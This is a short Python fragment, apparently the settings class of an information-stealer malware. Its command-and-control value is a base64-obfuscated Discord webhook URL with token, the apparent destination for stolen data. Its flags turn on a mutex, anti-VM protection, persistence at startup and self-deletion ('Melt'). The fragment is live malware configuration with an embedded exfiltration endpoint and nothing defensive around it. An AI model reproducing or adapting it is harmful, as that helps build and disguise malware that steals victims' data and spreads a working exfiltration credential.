...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5NjQ1NzY3MjY5NDA0MjY5NS9FakpYSV9tR192dW5jeHp5ZnpXa1FRT0FPSVV4NWo1YWxQN241Njdld1FMekVlN0dpNWxnNU9YUnNRNFJhZDFaeVNWeQ==').decode())
    Mutex = base64.b64decode('M1RXM29hVGNoWmtqVjQ4bw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
